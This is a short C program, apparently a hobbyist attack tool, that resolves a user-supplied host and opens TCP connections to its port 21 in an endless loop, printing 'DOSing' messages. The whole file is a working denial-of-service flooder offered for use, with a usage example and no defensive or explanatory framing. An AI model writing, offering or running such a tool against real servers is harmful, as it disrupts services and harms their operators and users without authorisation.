#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char *argv[]){

    int sockets;
    int connection;
    char *host;

    struct sockaddr_in target;

    if(argc != 2){
    
        printf("Usage: %s <ip/domain>\n", argv[0]);
        printf("Example: %s domain.com\n", argv[0]);
    
    } else {
        
        struct hostent *domain = gethostbyname(argv[1]);
        
        if(domain == NULL){
        
            printf("Invalid hostname!\n");
        
        } else {
            
            host = inet_ntoa(*((struct in_addr *)domain->h_addr));
            printf("CTRL+C to exit.\n");
            sleep(4);

            for(int i=0; i!=1;){

            sockets = socket(AF_INET, SOCK_STREAM, 0);
            target.sin_family = AF_INET;
            target.sin_port = htons(21);
            target.sin_addr.s_addr = inet_addr(host);
            connection = connect(sockets, (struct sockaddr *)&target, sizeof(target));

                if(connection == 0){
                    printf("DOSing %s\n", host); 
                } else {
                    printf("Attack stopped!\n");
                }
            }
        }
    }
    return 0;
}
